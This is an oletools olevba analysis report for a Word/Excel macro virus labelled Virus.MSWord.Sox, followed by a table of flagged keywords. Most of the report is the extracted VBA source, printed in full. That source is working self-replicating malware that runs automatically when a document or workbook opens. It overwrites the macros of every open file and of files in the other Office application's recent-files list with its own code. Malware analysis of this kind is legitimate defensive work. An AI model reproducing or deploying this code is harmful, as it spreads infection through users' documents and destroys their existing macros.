olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sox
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sox - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Sox - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
Cross_Lys Workbooks, ThisWorkbook, "Word.Application"
End Sub
Private Sub Document_Open()
Cross_Lys Documents, ThisDocument, "Excel.Application"
End Sub
Private Function Cross_Lys(Target As Object, Host As Object, Cross As String)
On Error Resume Next
MyCode = Host.VBProject.VBComponents(1).CodeModule.Lines(1, Host.VBProject.VBComponents(1).CodeModule.CountOfLines)
For X = 1 To Target.Count
With Target(X).VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString MyCode
Target(X).SaveAs FileName:=Documents(X).FullName
End With
Next
Set CrossApp = GetObject(, Cross)
If CrossApp = "" Then
Set CrossApp = CreateObject(Cross)
CrossQuit = True
End If
If CrossApp.Application.RecentFiles.Count >= 1 Then
For X = 1 To CrossApp.Application.RecentFiles.Count
With CrossApp.Application.RecentFiles(X).Open
.VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
.VBProject.VBComponents(1).CodeModule.AddFromString MyCode
.SaveAs FileName:=.FullName
End With
Next
If CrossQuit = True Then CrossApp.Quit
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

